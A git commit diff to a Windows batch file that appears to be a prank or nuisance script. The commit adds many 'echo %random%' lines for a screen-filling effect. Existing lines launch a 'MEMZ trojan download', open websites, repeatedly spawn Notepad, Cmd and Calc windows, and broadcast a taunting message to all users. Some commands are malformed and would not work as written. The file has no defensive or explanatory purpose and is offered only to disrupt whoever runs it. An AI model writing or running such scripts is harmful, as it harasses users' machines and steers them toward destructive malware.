3c9a20cc612d3f1a3197de80ab597ff241c1e524
lagalapizza_1011 <52937131+SH0-ahacker@users.noreply.github.com>
2019-11-15 18:49:39 -0300

    Update .bat

--- .bat
+++ .bat
@@ -56,9 +56,24 @@ Cmd
 Start MEMZ trojan download
 Start cursorpart.com
 Start crymyip.com/
+echo %random% %random% %random% %random% %random% random% %random%%random% %random% %random% random% %random%%random% %random% %random% random% %random%%random% %random% %random% random% %random%%random% %random% %random%
+echo %random% %random% %random% %random% %random% random% %random%%random% %random% %random% random% %random%%random% %random% %random% random% %random%%random% %random% %random% random% %random%%random% %random% %random%
+echo %random% %random% %random% %random% %random% random% %random%%random% %random% %random% random% %random%%random% %random% %random% random% %random%%random% %random% %random% random% %random%%random% %random% %random%
+echo %random% %random% %random% %random% %random% random% %random%%random% %random% %random% random% %random%%random% %random% %random% random% %random%%random% %random% %random% random% %random%%random% %random% %random%
+echo %random% %random% %random% %random% %random% random% %random%%random% %random% %random% random% %random%%random% %random% %random% random% %random%%random% %random% %random% random% %random%%random% %random% %random%
+echo %random% %random% %random% %random% %random% random% %random%%random% %random% %random% random% %random%%random% %random% %random% random% %random%%random% %random% %random% random% %random%%random% %random% %random%
+echo %random% %random% %random% %random% %random% random% %random%%random% %random% %random% random% %random%%random% %random% %random% random% %random%%random% %random% %random% random% %random%%random% %random% %random%
+echo %random% %random% %random% %random% %random% random% %random%%random% %random% %random% random% %random%%random% %random% %random% random% %random%%random% %random% %random% random% %random%%random% %random% %random%
+echo %random% %random% %random% %random% %random% random% %random%%random% %random% %random% random% %random%%random% %random% %random% random% %random%%random% %random% %random% random% %random%%random% %random% %random%
+echo %random% %random% %random% %random% %random% random% %random%%random% %random% %random% random% %random%%random% %random% %random% random% %random%%random% %random% %random% random% %random%%random% %random% %random%
+echo %random% %random% %random% %random% %random% random% %random%%random% %random% %random% random% %random%%random% %random% %random% random% %random%%random% %random% %random% random% %random%%random% %random% %random%
+echo %random% %random% %random% %random% %random% random% %random%%random% %random% %random% random% %random%%random% %random% %random% random% %random%%random% %random% %random% random% %random%%random% %random% %random%
+
 Notepad
 Notepad
 Cmd
+echo %random% %random% %random% %random% %random% random% %random%%random% %random% %random% random% %random%%random% %random% %random% random% %random%%random% %random% %random% random% %random%%random% %random% %random%
+
 Msg * lol gangsta, lolololololololol
 Calc
 Calc
